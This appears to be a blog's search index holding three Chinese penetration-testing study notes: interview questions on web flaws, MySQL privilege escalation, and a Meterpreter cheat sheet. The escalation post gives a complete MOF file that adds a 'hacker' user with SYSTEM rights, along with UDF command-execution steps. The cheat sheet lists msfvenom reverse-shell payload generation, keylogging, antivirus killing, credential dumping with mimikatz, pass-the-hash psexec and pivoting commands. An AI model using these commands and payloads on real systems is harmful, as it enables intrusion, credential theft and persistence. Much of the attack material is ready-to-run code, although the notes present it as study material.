<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>渗透测试面试题</title>
    <link href="/2022/11/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    <url>/2022/11/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>1.为何一个MYSQL数据库的站，只有一个80端口开放?</p><p>2.一个成熟并且相对安全的CMS，渗透时扫目录的意义?</p><p>3.在某后台新闻编辑界面看到编辑器，应该先做什么?</p><p>4.审查上传点的元素有什么意义?</p><p>5.CSRF、XSS及XXE有什么区别，以及修复方式?</p><p>6.3389无法连接的几种情况</p><p>7.列举出owasp top10 2019</p><p>8.说出至少三种业务逻辑漏洞，以及修复方式?</p><p>9.目标站无防护，上传图片可以正常访问，上传脚本格式访问则403，什么原因?</p><p>10.目标站禁止注册用户，找回密码处随便输入用户名提示:“此用户不存在”，你觉得这里怎样利用?</p><h1 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h1><p>1.为何一个MYSQL数据库的站，只有一个80端口开放?</p><ul><li>更改了端口，没有扫描出来；</li><li>站库分离；</li><li>3306端口不对外开放。</li></ul><p>2.一个成熟并且相对安全的CMS，渗透时扫目录的意义?</p><ul><li>敏感文件、二级目录扫描；</li><li>站长的误操作比如：网站备份的压缩文件、说明.txt、二级目录可能存放着其他站点。</li></ul><p>3.在某后台新闻编辑界面看到编辑器，应该先做什么?</p><ul><li>查看编辑器的名称版本，然后搜索公开的漏洞</li></ul><p>4.审查上传点的元素有什么意义?</p><ul><li>有些站点的上传文件类型限制是在前端实现的，这时候只要增加上传类型就能突破限制了。</li></ul><p>5.CSRF、XSS及XXE有什么区别，以及修复方式?</p><ul><li>XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。</li><li>CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer。</li><li>XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。</li></ul><p>6.3389无法连接的几种情况</p><ul><li>没有开放3389；</li><li>端口被修改；</li><li>防护拦截；</li><li>处于内网（需要进行端口转发）</li></ul><p>7.列举出owasp top10 2019</p><ul><li>注入</li><li>失效的身份认证</li><li>敏感信息泄露</li><li>XML外部实体(XXE)</li><li>失效的访问控制</li><li>安全配置错误</li><li>跨站脚本(XSS)</li><li>不安全的反序列化</li><li>使用含有已知漏洞的组件</li><li>不足的日志记录和监控</li></ul><p>8.说出至少三种业务逻辑漏洞，以及修复方式?</p><ul><li>密码找回漏洞中存在密码允许暴力破解、存在通用型找回凭证、阔以跳过验证步骤、找回凭证可以拦包获取等方式来通过厂商提供的密码找回功能来得到密码；</li><li>身份认证漏洞中最常见的是会话固定攻击和cookie仿冒，只要得到session或cookie即可伪造用户身份；</li><li>验证码漏洞中存在验证码允许暴力破解、验证码可以通过JavaScript或者改包的方法来绕过。</li></ul><p>9.目标站无防护，上传图片可以正常访问，上传脚本格式访问则403，什么原因?</p><ul><li>原因有很多，有可能web服务器配置把上传目录写死了不执行相应脚本，尝试改后缀名绕过。</li></ul><p>10.目标站禁止注册用户，找回密码处随便输入用户名提示:“此用户不存在”，你觉得这里怎样利用?</p><ul><li>先爆破用户名,再利用被爆破出来的用户名爆破密码;其实有些站点,在登陆处也会这样提示;所有和数据库交互的地方都有可能有注入。</li></ul>]]></content>
    
    
    <categories>
      
      <category>面试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>面试题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MySQL提权</title>
    <link href="/2022/10/31/MySQL%E6%8F%90%E6%9D%83/"/>
    <url>/2022/10/31/MySQL%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h3 id="低权限用户提升root"><a href="#低权限用户提升root" class="headerlink" title="低权限用户提升root"></a>低权限用户提升root</h3><h5 id="前提："><a href="#前提：" class="headerlink" title="前提："></a>前提：</h5><p>已经有一个低权限的webshell,想把低权限用户提升至root。</p><p>1.读取网站数据库配置文件(conn.php,config.php,dbconfig.php,config.inc.php,common.inc.php,inc,conn,config.sql,common,data sql,data,inc,config,conn,database,common,include）</p><p>2.访问数据库安装路径(select @@basedir)下的   mysql&#x2F;user.myd)文件。</p><ul><li>覆盖这三个文件</li><li>读取user.MYD文件，复制这段MD5值去解密（可能不全）</li><li>mysql.ini添加：skip-grant-tables</li></ul><p>直接读取数据库账号密码</p><p>3 . 下载对方 user.frm &#x2F; user.MYD &#x2F; user.MYI 3个数据库文件到本地新建一个数据库,打开对应数据库的文件夹,导入这3张表,即可查看。</p><p><img src="/../images/MySQL%E6%8F%90%E6%9D%83/image-20221031191149773.png" alt="示例"></p><h3 id="MySQL允许远程登陆"><a href="#MySQL允许远程登陆" class="headerlink" title="MySQL允许远程登陆"></a>MySQL允许远程登陆</h3><p>出现%代表可以远程登陆，一般只有三个用户  local host, 127.0.0.1,  ::1</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Grant</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">privileges</span> <span class="hljs-keyword">on</span> *.* <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> identified <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;root&#x27;</span> <span class="hljs-keyword">with</span> <span class="hljs-keyword">grant</span> <span class="hljs-keyword">option</span><br></code></pre></td></tr></table></figure><p><img src="/../images/MySQL%E6%8F%90%E6%9D%83/image-20221031191529895.png" alt="示例"></p><h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><h5 id="定义及使用条件："><a href="#定义及使用条件：" class="headerlink" title="定义及使用条件："></a>定义及使用条件：</h5><p>udf(Userdefined function)是用户自定义函数简写。(意义在于我们可以像使用version()函数一样方便)</p><p>​需要使用root权限，对于5.2以上的版本，将文件udf.dll导出到系统目录下，可以需要使用udf.dll来提权，还需secure_file_priv的设置不为NULL建执行系统命令的函数来调用执行cmd。</p><p>在MySQL高版本中secure-file-priv参数限制了MySQL的导出:</p><ol><li>NULL，表示禁止</li><li>如果value值有文件夹目录，则表示只允许该目录下文件（子目录都不行)</li><li>如果为空(没有值)，则表示不限制目录</li></ol><p>MySQL5.0&#x2F;5.6版本: my.ini中无此参数，查询该参数情况为空，不限制目录</p><p>MySQL5.7版本:my.ini中存在参数，查询该参数情况为NULL，不允许</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">Show <span class="hljs-keyword">VARIABLES</span> like <span class="hljs-comment">&quot;%SECURE%&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/../images/MySQL%E6%8F%90%E6%9D%83/image-20221031192130859.png" alt="示例"></p><p>现在基本上windows的服务器是以下两个路径导出UDF.DLL</p><p>Mysql版本大于5.1版本。udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下。(如果lib目录下没有plugin文件夹,就手动创建一个)</p><p>Mysql版本小于5.1版本。udf.dll文件在Windows2003下放置于c:\windows\system32，在windows2000下放置于c:\winnt\system32</p><h5 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h5><ul><li>导入脚本提权: 使用msf自带的udf提权库，进行提权。</li><li>先查询系统是什么版本 ,上传适合的dll包。 – select @@version_compile_os, @@version_compile_machine;</li><li>创建表,添加内容进去。– CREATE FUNCTION sys_eval RETURNS STRING SONAME ‘udf.dll’;</li><li>查询是否添加成功：– select * from mysql.func;</li><li>执行命令 :– select sys_eval(‘whoami’)</li></ul><h5 id="or使用PHP大马提权"><a href="#or使用PHP大马提权" class="headerlink" title="or使用PHP大马提权"></a>or使用PHP大马提权</h5><p><img src="/../images/MySQL%E6%8F%90%E6%9D%83/image-20221031192553805.png" alt="示例"></p><h3 id="MySQL–mof提权"><a href="#MySQL–mof提权" class="headerlink" title="MySQL–mof提权"></a>MySQL–mof提权</h3><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h5><p>​在windows平台下，c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof这个文件会每间隔一段时间（很短暂）就会以system权限执行一次，所以，只要我们将想要的操作通过代码存储到这个mof文件中，就可以实现权限提升。</p><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a><strong>利用条件</strong></h5><ol><li><strong>windows 03及以下版本</strong></li><li>mysql启动身份具有权限去读写c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof目录</li><li>secure-file-priv参数不为null</li></ol><h5 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a><strong>利用方式</strong></h5><p>拿下webshell之后当前权限仅限于对网站文件的操作，想要获取对主机的操作还需进一步提权。</p><p>使用sql语句，通过mysql的dumpfile操作将恶意mof文件拷贝到服务器的c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;目录下，将系统当中默认的nullevt.mof给替换掉，进而让系统执行我们这个恶意的mof文件</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">select</span> load_file(<span class="hljs-string">&#x27;mof提权文件及路径&#x27;</span>) <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;c:/windows/system32/wbem/mof/nullevt.mof&#x27;</span><br></code></pre></td></tr></table></figure><h5 id="mof提权代码"><a href="#mof提权代码" class="headerlink" title="mof提权代码"></a>mof提权代码</h5><p><strong>nullevt.mof</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br><br>instance of __EventFilter <span class="hljs-keyword">as</span> <span class="hljs-variable">$EventFilter</span><br>&#123;<br>    EventNamespace = <span class="hljs-string">&quot;Root\\Cimv2&quot;</span>;<br>    Name  = <span class="hljs-string">&quot;filtP2&quot;</span>;<br>    Query = <span class="hljs-string">&quot;Select * From __InstanceModificationEvent &quot;</span><br>            <span class="hljs-string">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br>            <span class="hljs-string">&quot;And TargetInstance.Second = 5&quot;</span>;<br>    QueryLanguage = <span class="hljs-string">&quot;WQL&quot;</span>;<br>&#125;;<br><br>instance of ActiveScriptEventConsumer <span class="hljs-keyword">as</span> <span class="hljs-variable">$Consumer</span><br>&#123;<br>    Name = <span class="hljs-string">&quot;consPCSV2&quot;</span>;<br>    ScriptingEngine = <span class="hljs-string">&quot;JScript&quot;</span>;<br>    ScriptText =<br>    <span class="hljs-string">&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net user hacker 123456 /add\&quot;)&quot;</span>;<br>    <span class="hljs-comment">//cmd以system权限执行的语句</span><br>&#125;;<br><br>instance of __FilterToConsumerBinding<br>&#123;<br>    Consumer   = <span class="hljs-variable">$Consumer</span>;<br>    Filter = <span class="hljs-variable">$EventFilter</span>;<br>&#125;;<br></code></pre></td></tr></table></figure><p>再将执行命令net user hacker 123456 &#x2F;add换为net localgroup administrators hacker &#x2F;add即可将hacker用户添加至administrators管理员组。</p><h5 id="安全防范"><a href="#安全防范" class="headerlink" title="安全防范"></a>安全防范</h5><ol><li>对mysql目录权限进行严格限制</li><li>设置复杂的root账号密码</li><li>设置c:&#x2F;windows&#x2F;system32&#x2F;wbem目录为不可写</li></ol><h3 id="反弹提权"><a href="#反弹提权" class="headerlink" title="反弹提权"></a>反弹提权</h3><h5 id="前提"><a href="#前提" class="headerlink" title="前提:"></a>前提:</h5><ol><li>通过网站无法获取webshell</li><li>Webshell无法执行命令</li><li>有phpmyadmin和root账号，无法查询或者无法获取网站的真实路径</li></ol><h5 id="要求"><a href="#要求" class="headerlink" title="要求:"></a>要求:</h5><ol><li>必须是一个root权限</li><li>能写入相对应的plugin目录</li><li>secure_file_priv 这个参数的值不能为NULL</li></ol><p><img src="/../images/MySQL%E6%8F%90%E6%9D%83/image-20221031193037951.png" alt="示例"></p><hr><p>个人学习小结,具体测试利用方式需根据具体实践场景。</p>]]></content>
    
    
    <categories>
      
      <category>内网</category>
      
    </categories>
    
    
    <tags>
      
      <tag>提升</tag>
      
      <tag>渗透测试</tag>
      
      <tag>MySQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>meterpreter学习笔记</title>
    <link href="/2022/10/28/meterpreter%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/10/28/meterpreter%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="mimikatz、内网渗透psexec、内网渗透-开启远程终端-添加账号、端口转发、跨路由访问。"><a href="#mimikatz、内网渗透psexec、内网渗透-开启远程终端-添加账号、端口转发、跨路由访问。" class="headerlink" title="mimikatz、内网渗透psexec、内网渗透-开启远程终端-添加账号、端口转发、跨路由访问。"></a>mimikatz、内网渗透psexec、内网渗透-开启远程终端-添加账号、端口转发、跨路由访问。</h2><span id="more"></span><h4 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作:"></a>基础操作:</h4><p>1 . 生成木马</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Linux:<br>msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"></span><br><span class="hljs-built_in">Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f elf &gt; shell.elf<br><br>Windows:<br>msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"></span><br><span class="hljs-built_in">Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f exe &gt; shell.exe<br><br>Mac:<br>msfvenom -p osx/x86/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span><br>Connect On&gt; -f macho &gt; shell.macho<br><br>PHP:<br>msfvenom -p php/meterpreter_reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port</span><br><span class="hljs-built_in"></span><span class="hljs-keyword">to</span> Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.php<br>cat shell.php | pbcopy &amp;&amp; echo <span class="hljs-string">&#x27;&lt;?php &#x27;</span> | tr -d <span class="hljs-string">&#x27;\n&#x27;</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt;<br>shell.php<br><br>ASP:<br>msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"></span><br><span class="hljs-built_in">Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f asp &gt; shell.asp<br><br>JSP:<br>msfvenom -p java/jsp_shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port</span><br><span class="hljs-built_in"></span><span class="hljs-keyword">to</span> Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.jsp<br><br>WAR:<br>msfvenom -p java/jsp_shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port</span><br><span class="hljs-built_in"></span><span class="hljs-keyword">to</span> Connect On&gt; -f war &gt; shell.war<br><br>Python:<br>msfvenom -p cmd/unix/reverse_python <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span><br>Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.py<br><br>Bash :<br>msfvenom -p cmd/unix/reverse_bash <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span><br>Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.sh<br><br>Perl:<br>msfvenom -p cmd/unix/reverse_perl <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span><br>Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.pl<br></code></pre></td></tr></table></figure><p>2 .生成监听器 :</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> PAYLOAD <span class="hljs-comment">&lt;Payload name&gt;</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LHOST &lt;LHOST value&gt;</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LPORT &lt;LPORT value&gt;</span><br>run<br></code></pre></td></tr></table></figure><h4 id="Meterpreter操作指南"><a href="#Meterpreter操作指南" class="headerlink" title="Meterpreter操作指南 :"></a>Meterpreter操作指南 :</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">backgroup</span> 放置后台<br><span class="hljs-attribute">sessions</span> 查看后台会话<br><span class="hljs-attribute">sessions</span> <span class="hljs-number">1</span> 选择会话<br><span class="hljs-attribute">sessions</span> -k <span class="hljs-number">1</span> 杀死会话<br></code></pre></td></tr></table></figure><p>常用操作 :</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs awk">meterpreter &gt; background 放回后台<br>meterpreter &gt; <span class="hljs-keyword">exit</span> 关闭会话<br>meterpreter &gt; help 帮助信息<br>meterpreter &gt; Sysinfo 系统平台信息<br>meterpreter &gt; screenshot 屏幕截取<br>meterpreter &gt; shell 命令行shell (<span class="hljs-keyword">exit</span>退出)<br>meterpreter &gt; getlwd 查看本地目录<br>meterpreter &gt; lcd 切换本地目录<br>meterpreter &gt; getwd 查看目录<br>meterpreter &gt; ls 查看文件目录列表<br>meterpreter &gt; cd 切换目录<br>meterpreter &gt; rm 删除文件<br>meterpreter &gt; download C:\\Users\\<span class="hljs-number">123</span>\\Desktop\\<span class="hljs-number">1</span>.txt <span class="hljs-number">1</span>.txt 下载文件<br>meterpreter &gt; upload <span class="hljs-regexp">/var/</span>www/wce.exe wce.exe 上传文件<br>meterpreter &gt; search -d c: -f *.doc 搜索文件<br>meterpreter &gt; execute -f cmd.exe -i 执行程序/命令<br>meterpreter &gt; ps 查看进程<br>meterpreter &gt; run post<span class="hljs-regexp">/windows/</span>capture/keylog_recorder 键盘记录<br>meterpreter &gt; getuid 查看当前用户权限<br>meterpreter &gt; use priv 加载特权模块<br>meterpreter &gt; getsystem 提升到SYSTEM权限<br>meterpreter &gt; hashdump 导出密码散列<br>meterpreter &gt; ps 查看高权限用户PID<br>meterpreter &gt; steal_token &lt;PID&gt; 窃取令牌<br>meterpreter &gt; rev2self 恢复原来的令牌<br>meterpreter &gt; migrate pid 迁移进程<br>meterpreter &gt; run killav 关闭杀毒软件<br>meterpreter &gt; run getgui-e 启用远程桌面<br>meterpreter &gt; portfwd add -l <span class="hljs-number">1234</span> -p <span class="hljs-number">3389</span> -r &lt;目标IP&gt; 端口转发<br>meterpreter &gt; run get_local_subnets 获取内网网段信息<br>meterpreter &gt; run autoroute -s &lt;内网网段&gt; 创建自动路由<br>meterpreter &gt; run autoroute -p 查看自动路由表<br><br>创建代理通道:<br>msf &gt; use auxiliary<span class="hljs-regexp">/server/</span>socks4a 设置socks4代理模块<br>msf auxiliary(socks4a) &gt; show options<br>msf auxiliary(socks4a) &gt; run<br>配置proxychains参数：<br>nano <span class="hljs-regexp">/etc/</span>proxychains.conf 修改代理监听端口,和前面端口一致<br></code></pre></td></tr></table></figure><h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz :"></a>mimikatz :</h4><p>在最新的版本中load mimikatz已经取消 现在使用kiwi模块</p><p>load kiwi</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">creds_all：列举所有凭据<br>creds_kerberos：列举所有kerberos凭据<br>creds_msv：列举所有msv凭据<br>creds_ssp：列举所有ssp凭据<br>creds_tspkg：列举所有tspkg凭据<br>creds_wdigest：列举所有wdigest凭据<br>dcsync：通过DCSync检索用户帐户信息<br>dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID<br>golden_ticket_create：创建黄金票据<br>kerberos_ticket_list：列举kerberos票据<br>kerberos_ticket_purge：清除kerberos票据<br>kerberos_ticket_use：使用kerberos票据<br>kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令<br>ls<span class="hljs-built_in">a_dump</span>_sam：dump出lsa的SAM<br>ls<span class="hljs-built_in">a_dump</span>_secrets：dump出lsa的密文<br>password_change：修改密码<br>wifi_list：列出当前用户的wifi配置文件<br>wifi_list_shared：列出共享wifi配置文件/编码<br><br>creds_all #该命令可以列举系统中的明文密码 <br>kiwi_cmd kiwi_cmd 模块可以让我们使用mimikatz的全部功能，该命令后面接 mimikatz.exe 的命令 <br><span class="hljs-title">例如 ：kiwi_cmd sekurlsa::</span>logonpasswords<br></code></pre></td></tr></table></figure><h4 id="内网渗透-psexec："><a href="#内网渗透-psexec：" class="headerlink" title="内网渗透 psexec："></a>内网渗透 psexec：</h4><p>参考 : <a href="https://blog.csdn.net/qq_46258964/article/details/124216187">https://blog.csdn.net/qq_46258964/article/details/124216187</a></p><p>在metasploite中存在一个psexec模块可以使用获取的hash进行登录</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/windows/smb/psexec<br><span class="hljs-keyword">set</span> SMBUser <span class="hljs-comment">administrator</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">smbpass aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">payload windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lhost 10.10.10.139</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lport 6666</span><br>exploit<br><br>ps <span class="hljs-comment">:</span> 除了可以用<span class="hljs-comment">hash</span> 也可以使用明文<br></code></pre></td></tr></table></figure><h4 id="内网渗透-开启远程终端-添加账号"><a href="#内网渗透-开启远程终端-添加账号" class="headerlink" title="内网渗透-开启远程终端-添加账号 :"></a>内网渗透-开启远程终端-添加账号 :</h4><p> getgui 模块——开启远程桌面</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> getgui -e 开启远程终端<br><span class="hljs-built_in">run</span> post/windows/manage/enable_rdp<br><span class="hljs-built_in">run</span> getgui -u m -p QWEasd123 添加本地管理员<br></code></pre></td></tr></table></figure><h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><p>如果服务器防火墙开启的情况下，有可能拦截远程终端端口，使用命令把远程端口3389转发出来</p><p>端口转发可以让攻击机访问本来无法直接访问的目标主机。portfwd可以反弹单个端口到本地并且监听。</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs diff">meterpreter &gt; portfwd add -l 3389 -r 192.168.0.130 -p 3389<br><span class="hljs-deletion">-l 本地监听端口</span><br><span class="hljs-deletion">-r 远程地址</span><br><span class="hljs-deletion">-p 远程端口</span><br></code></pre></td></tr></table></figure><p>端口转发到本地1234端口</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">rdesktop</span> <span class="hljs-number">127.0.0.1:1234</span><br></code></pre></td></tr></table></figure><h4 id="跨路由访问"><a href="#跨路由访问" class="headerlink" title="跨路由访问"></a>跨路由访问</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">在渗透测试过程中，经常拿到web主机与数据库不同在一个网段，可以得出这台主机还连着一个内网，<br>如果想要继续渗透内网，可以把这台web主机当作跳板机，对内网进行渗透<br></code></pre></td></tr></table></figure><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arduino">获取内网网卡命令 <br>run get_local_subnets<br>绑定路由 不绑定路由就没法访问目标主机<br>run autoroute -s <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span> <br>route add <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span 